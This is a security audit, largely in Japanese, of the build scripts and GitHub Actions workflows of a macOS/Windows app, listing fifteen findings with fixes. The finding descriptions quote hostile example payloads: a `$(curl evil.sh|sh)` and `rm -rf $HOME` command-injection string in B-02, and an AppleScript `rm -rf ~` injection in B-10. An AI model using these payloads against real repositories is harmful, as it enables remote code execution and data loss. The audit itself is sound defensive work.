# 05 — Build & CI audit

検証対象: `build.sh`, `build-dmg.sh`, `build-pkg.sh`, `release.sh`,
`.github/workflows/release.yml`, `.github/workflows/claude.yml`,
`.github/workflows/windows-build.yml`, `fastlane/`, `fastlane-macos/`
監査日: 2026-05-26
方法: 静的監査 (Explore + 再 grep 検証)

> This is a friendly audit prepared by an external contributor. All
> suggestions are non-binding; happy to discuss, revise, or drop any item.

## サマリー

| ID | 優先度 | 概要 | File |
|---|---|---|---|
| B-01 | P1 | `build.sh` / `build-dmg.sh` が `set -e` のみで `-u -o pipefail` 欠落 | `build.sh:2`, `build-dmg.sh:2` |
| B-02 | P1 | `claude.yml` がイシュー本文を shell に直接展開しコマンドインジェクション可能 | `.github/workflows/claude.yml:27` |
| B-03 | P1 | GitHub Actions の third-party action が SHA pin されておらず supply-chain 攻撃面 | `.github/workflows/release.yml:31`, `claude.yml:30`, `windows-build.yml:19,67,97` |
| B-04 | P1 | `build.sh` がリリース署名ID をハードコードし、CI／他開発者が無音で ad-hoc 署名に降格 | `build.sh:336` |
| B-05 | P1 | `build.sh` の entitlements 動的生成で `allow-unsigned-executable-memory` + `disable-library-validation` を常時付与 | `build.sh:344-361` |
| B-06 | P2 | `build.sh` の `stapler staple ... 2>/dev/null \|\| true` で公証ステープル失敗を無音化 | `build.sh:394` |
| B-07 | P2 | `release.sh` が `git push --tags -f` でタグを強制上書き | `release.sh:235` |
| B-08 | P2 | `release.sh` が `gh release upload --clobber` で既存リリースアセットを上書き | `release.sh:268` |
| B-09 | P2 | `build-pkg.sh` が `bash build.sh --no-launch 2>/dev/null \|\| true` でビルド失敗を握り潰す | `build-pkg.sh:12` |
| B-10 | P2 | `build-dmg.sh` の `osascript` ヒアドキュメントが変数を unquoted 展開 (将来のインジェクション面) | `build-dmg.sh:43-66` |
| B-11 | P2 | `build.sh` が `/tmp/Koe-install.zip` を予測可能パスで作成 (multi-user host で symlink race) | `build.sh:392,395` |
| B-12 | P3 | `windows-build.yml` の CUDA / NSIS ステップが `continue-on-error: true` でリリースアセットが無音で欠落しうる | `.github/workflows/windows-build.yml:50,100,105` |
| B-13 | P3 | `build-pkg.sh` の `SIGN_ID` SHA-1 フィンガープリント定数が未使用のデッドコード | `build-pkg.sh:9` |
| B-14 | P3 | `release.yml` に `concurrency` 設定がなく、同タグへの push race で重複アセットアップロード | `.github/workflows/release.yml` |
| B-15 | P3 | `build.sh` の `ALL_LIB_DIRS` が unquoted 文字列で `for dir in $ALL_LIB_DIRS` 展開、パスに空白があると壊れる | `build.sh:238,242` |

## 詳細

### B-01 (P1) — `set -e` のみで bash strict mode 未適用

**File**: `build.sh:2`, `build-dmg.sh:2`
**Symptom**: 両スクリプトの先頭が `set -e` のみ。
**Impact**: 未定義変数 (`$WHISPER_LIBEXEC_LIB` 等の条件分岐内変数) や、パイプライン途中の失敗 (`hdiutil attach | grep | awk` の `hdiutil attach` 失敗) が検知されない。`build-pkg.sh:2` と `release.sh:14` は既に `set -euo pipefail` なので統一が望ましい。

**Suggested fix (本 PR で部分実施)**:
```bash
# build.sh:2 / build-dmg.sh:2
set -eo pipefail
```
本 PR では `pipefail` のみ追加し、`-u` (nounset) は **意図的に未適用**。`build.sh` は条件分岐内で `WHISPER_LIBEXEC_LIB` などのオプショナル変数を多数使っており、`-u` を有効にするとそれらの参照箇所を `${VAR:-}` でガードする付随修正が必要になるため、別 PR (案: PR #2 macOS 安定性) で扱うのが安全。`build-pkg.sh` / `release.sh` には既に `-u` が入っているが、build.sh とは前提が異なる。

### B-02 (P1) — `claude.yml` の issue body shell injection

**File**: `.github/workflows/claude.yml:27`
**Symptom**: `echo "prompt=...${{ github.event.issue.title }}\n内容:\n${{ github.event.issue.body }}..." >> $GITHUB_OUTPUT` で、issue タイトル／本文が shell の echo に直接展開される。
**Impact**: 攻撃者が issue タイトルに `` `rm -rf $HOME` `` や `$(curl evil.sh|sh)` を含めると、`labeled` トリガーの瞬間に runner で実行される。`permissions: contents: write, pull-requests: write` 付きなので任意の push / PR 作成が可能。
**Suggested fix**: env 経由で渡すか、`gh issue view` で取得:
```yaml
- name: Build prompt from issue
  id: prompt
  env:
    ISSUE_NUMBER: ${{ github.event.issue.number }}
    ISSUE_TITLE: ${{ github.event.issue.title }}
    ISSUE_BODY: ${{ github.event.issue.body }}
  run: |
    {
      echo 'prompt<<PROMPT_EOF'
      printf 'イシュー #%s を実装してください。\nタイトル: %s\n内容:\n%s\n' \
        "$ISSUE_NUMBER" "$ISSUE_TITLE" "$ISSUE_BODY"
      echo 'PROMPT_EOF'
    } >> "$GITHUB_OUTPUT"
```

### B-03 (P1) — GitHub Actions が SHA pin されていない

**File**: `.github/workflows/release.yml:15,31`, `claude.yml:21,30`, `windows-build.yml:16,19,22,53,60,67,91,94,97,109`
**Symptom**: `actions/checkout@v4`, `softprops/action-gh-release@v2`, `anthropics/claude-code-action@v1`, `dtolnay/rust-toolchain@stable`, `actions/cache@v4`, `Jimver/cuda-toolkit@v0.2.16` 等すべて moving tag。
**Impact**: tag 上書き攻撃 / メンテナアカウント乗っ取り時に、`secrets.ANTHROPIC_API_KEY` / `APPLE_ID` / `APPLE_PASSWORD` / `TEAM_ID` / `GITHUB_TOKEN(write)` が抜かれる。Dependabot の `groups:` で SHA pin + 自動更新が現代の慣行。
**Suggested fix**:
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
- uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844  # v2.1.0
```
加えて `.github/dependabot.yml` に `package-ecosystem: github-actions` を登録。

### B-04 (P1) — `SIGN_ID` ハードコードで CI が無音で ad-hoc 署名に降格

**File**: `build.sh:336-340`
**Symptom**:
```bash
SIGN_ID="Developer ID Application: Yuki Hamada (5BV85JW8US)"
if ! security find-identity -v -p codesigning 2>/dev/null | grep -q "$SIGN_ID"; then
    SIGN_ID="-"
    echo "⚠ Developer ID not found, using ad-hoc signing"
fi
```
**Impact**:
1. 他のメンテナ／フォークでビルドすると、`-` (ad-hoc) に勝手にフォールバックして配布物として通用しない署名のまま `.pkg`/`.dmg` が作られる。
2. CI 上で証明書 import に失敗しても警告 1 行だけで release.yml がそのまま `gh release` まで進む。
**Suggested fix**:
- `SIGN_ID` を env (`KOE_SIGN_ID`) 上書き可能に。
- CI では ad-hoc fallback を fatal にする (`[ -z "$CI" ] || { echo "FATAL: cert missing"; exit 1; }`)。

### B-05 (P1) — entitlements の動的生成で危険権限を常時付与

**File**: `build.sh:344-361`
**Symptom**: `entitlements.plist` がリポジトリに存在する場合はそれを使うが、無ければ動的生成し以下を **常に true**:
- `com.apple.security.cs.allow-unsigned-executable-memory`
- `com.apple.security.cs.disable-library-validation`
- `com.apple.security.automation.apple-events`

**Impact**:
- `disable-library-validation` は dylib injection 攻撃面を恒久的に広げる。bundled dylibs に Developer ID 署名が付いていれば本来不要。
- `allow-unsigned-executable-memory` も同様で、whisper.cpp の JIT 系を切ればまず不要。
- `automation.apple-events` はターゲットアプリ指定なしの bare entitlement で、悪用時に任意の AppleScript ターゲットを叩ける。

リポジトリには `entitlements.plist` (L341 参照) が存在するため通常は dynamic branch に入らないが、削除されると無音で fallback。
**Suggested fix**:
- dynamic-generation ブロックを削除し、`entitlements.plist` が無ければ `exit 1`。
- 各 entitlement の必要性を実機で再評価し、不要なものを外す。
- `automation.apple-events` は `com.apple.security.scripting-targets` でターゲット指定する形に変更。

### B-06 (P2) — stapler 失敗の無音化

**File**: `build.sh:391-396`
**Symptom**:
```bash
xcrun notarytool submit ... | grep -E "status:|Accepted|Error" || true
xcrun stapler staple "$APP" 2>/dev/null || true
```
**Impact**: notary 失敗 (Apple side rejection) も `stapler staple` 失敗もログから消える。リリースに非ステープル `.app` が混入し、Gatekeeper オフライン環境で起動不能になる可能性。
`release.sh:206-217` は事後ステープル検証をしているが warn 止まりで fatal にしない。
**Suggested fix**:
```bash
xcrun notarytool submit /tmp/Koe-install.zip --keychain-profile "notary" --wait
xcrun stapler staple "$APP"
xcrun stapler validate "$APP"
```
そして `release.sh:209,216` の警告を `fail` に昇格。

### B-07 (P2) — タグの強制上書き push

**File**: `release.sh:232,235`
**Symptom**: `git tag -f "$TAG"` + `git push origin HEAD --tags -f`。
**Impact**: 同じ `vX.Y.Z` タグでビルドし直すと、過去のリリース commit 参照が書き換わる。利用者が `git checkout vX.Y.Z` で取れるコードと、配布された pkg/dmg の中身が一致しなくなる。
**Suggested fix**: 既存タグを検出したら **bump して abort** ＋ 明示確認:
```bash
if git rev-parse "$TAG" >/dev/null 2>&1; then
    echo "Tag $TAG already exists. Bump version or delete tag explicitly."
    exit 1
fi
git push origin HEAD
git push origin "$TAG"      # -f 無し
```

### B-08 (P2) — GH Release asset の clobber

**File**: `release.sh:267-275`
**Symptom**: 既存タグ検出時に `gh release upload "$TAG" Koe.pkg Koe-Installer.dmg --clobber`。
**Impact**: 同じバージョンの古い pkg/dmg を上書きするので、ダウンロード済みユーザの SHA 検証が壊れる。AutoUpdater (L300) が tag ベースで参照しているので、user 端末のキャッシュと不一致になり再 DL を強いる。
**Suggested fix**: `--clobber` を外し、既存リリースでは追加アップロードを禁止 (`--clobber` を使うなら同時に `gh release edit --notes` で「rebuilt YYYY-MM-DD」を明記)。

### B-09 (P2) — `build-pkg.sh` がビルドエラーを握り潰す

**File**: `build-pkg.sh:12`
**Symptom**: `bash build.sh --no-launch 2>/dev/null || true`。
**Impact**: `build.sh` のエラーログが完全に消え、`set -euo pipefail` をすり抜けて pkgbuild へ進む。空 `Koe.app` で `.pkg` を作って気付かないリスク。L168 の `[ -f "$artifact" ]` チェックは pkg/dmg 自体の存在しか見ない (`build.sh` が部分的に成功して `Koe.app` がゴミ状態でも検知不能)。
**Suggested fix**:
```bash
echo "==> Building Koe.app..."
bash build.sh --no-launch
```
(`|| true` と stderr 抑制を両方外す)

### B-10 (P2) — `osascript` heredoc の変数展開 (将来のインジェクション)

**File**: `build-dmg.sh:43-66`
**Symptom**: `osascript <<APPLESCRIPT ... ${VOLUME_NAME} ... ${APP_NAME} ... $((100 + WIN_W)) ... APPLESCRIPT`。現状は全てスクリプト内ハードコード変数なので live exploit はない。
**Impact**: 将来 `VOLUME_NAME` を env / arg で外から渡せるようにした瞬間、`"; do shell script "rm -rf ~"; tell ... "` を流し込める。
**Suggested fix**: AppleScript 側で変数を埋め込まず、`osascript -e ... -e ...` の `-e` 引数として一行ずつ渡す。もしくは `osascript` への引数として渡し `on run argv` で受ける:
```bash
osascript - "${VOLUME_NAME}" "${APP_NAME}" "$WIN_W" "$WIN_H" <<'APPLESCRIPT'
on run argv
    set volName to item 1 of argv
    ...
end run
APPLESCRIPT
```

### B-11 (P2) — `/tmp/Koe-install.zip` を予測可能パスで作成

**File**: `build.sh:392,395`
**Symptom**: `ditto -c -k ... "$APP" /tmp/Koe-install.zip`。
**Impact**: マルチユーザ macOS host (CI shared runner / 学校 Mac) で、攻撃者が事前に `/tmp/Koe-install.zip` を symlink として作成しておくと、ditto が任意パスへ書き込みうる。`ditto` は symlink 先に書き込む挙動。さらに `rm -f /tmp/Koe-install.zip` (L395) も symlink ターゲットを誤って消す可能性。
**Suggested fix**: `mktemp` で per-run のディレクトリを切る:
```bash
TMPZ=$(mktemp -t Koe-install.XXXXXX.zip)
trap 'rm -f "$TMPZ"' EXIT
ditto -c -k --sequesterRsrc --keepParent "$APP" "$TMPZ"
xcrun notarytool submit "$TMPZ" --keychain-profile "notary" --wait
```

### B-12 (P3) — `continue-on-error: true` でリリース欠落の無音化

**File**: `.github/workflows/windows-build.yml:50,100,105`
**Symptom**:
- L50: NSIS インストーラ生成失敗で続行 → L60 の upload で `hashFiles(...) != ''` ガードがあるので無音スキップ。
- L100, L105: CUDA toolkit インストール／cargo build 失敗で続行 → L108 でファイル無しなら upload スキップ。
**Impact**: `win-v*` タグを切ってもリリースに CUDA バイナリやインストーラが入らない可能性、リリース自体は成功扱い。
**Suggested fix**: `continue-on-error` を外し、CUDA は別 job (`needs:` で release を分離)。失敗時はリリース job をスキップする matrix 構成に。

### B-13 (P3) — `build-pkg.sh:9` の dead constant

**File**: `build-pkg.sh:9`
**Symptom**: `SIGN_ID="F1EFBA93D51A3F2204A9E25679E1D77BA22DC59C"` — 以降未参照、L142 で `security find-identity` から動的に取得。
**Impact**: 個人の cert SHA-1 が VCS / GitHub に残り続ける (個人特定性は低いが Apple Developer ID の指紋なので一意に紐づく)。
**Suggested fix**: 単純に削除。

### B-14 (P3) — workflow の concurrency 未設定

**File**: `.github/workflows/release.yml`
**Symptom**: `concurrency:` ブロック無し。
**Impact**: 同じタグへの push を連打 / 別 branch から同名タグを push した時に複数ビルドが並走し、`gh release upload` レースで成果物が混ざる。
**Suggested fix**:
```yaml
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false   # tag リリースはキャンセルしない
```

### B-15 (P3) — `ALL_LIB_DIRS` の unquoted 展開

**File**: `build.sh:238,242,267,289`
**Symptom**: `ALL_LIB_DIRS="$WHISPER_LIB $LLAMA_LIB ..."` を `for dir in $ALL_LIB_DIRS` で word-split。
**Impact**: 現状は `/opt/homebrew/...` 固定で空白を含まないので動作するが、Homebrew prefix がカスタム (`/Users/foo bar/.homebrew`) になった瞬間ループが破綻し、install_name_tool 修正が部分的に走って配布物 unusable。
**Suggested fix**: 配列化:
```bash
ALL_LIB_DIRS=(
    "$WHISPER_LIB" "$LLAMA_LIB" "$GGML_LIB" "$GGML_METAL_LIB"
    "$GGML_BLAS_LIB" "$GGML_CPU_LIB" "$BREW_PREFIX/lib"
    "$BREW_PREFIX/opt/ggml/lib" "$BREW_PREFIX/opt/llama.cpp/lib"
    "$BREW_PREFIX/opt/whisper-cpp/lib"
    "$BREW_PREFIX/opt/whisper-cpp/libexec/lib"
    "$BREW_PREFIX/opt/llama.cpp/libexec/lib"
    "${WHISPER_LIBEXEC_LIB:-}"
)
for dir in "${ALL_LIB_DIRS[@]}"; do
    [ -z "$dir" ] && continue
    install_name_tool -change "$dir/$dep" "@rpath/$dep" "$lib" 2>/dev/null || true
done
```

## Out of scope (this PR)

- Notarization の代替経路 (App Store Connect API key 経由) への切り替え
- Sparkle / Squirrel ベースの自動更新移行
- `fastlane/` / `fastlane-macos/` の Appfile / Fastfile レビュー (本監査では `ls` 確認のみ)
- `Koe-windows/installer/koe-installer.nsi` の中身レビュー
- `build.sh` の install_name_tool 連鎖の根本リファクタ (dylib 名衝突問題そのもの)
